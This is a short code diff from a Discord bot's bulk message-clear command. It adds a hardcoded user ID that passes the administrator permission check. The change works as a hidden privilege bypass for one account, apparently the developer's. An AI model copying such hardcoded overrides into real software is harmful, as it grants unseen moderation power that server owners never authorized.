@@ -5,7 +5,9 @@ module.exports = {
 	description: 'Clear up to 99 messages.',
 	execute(message, args) {
 
-		if (message.member.hasPermission('ADMINISTRATOR')) {
+		if (
+			message.member.hasPermission('ADMINISTRATOR') ||
+			message.author.id == "672823761723981889" ){
 
 			const amount = parseInt(args[0]) + 1;
 
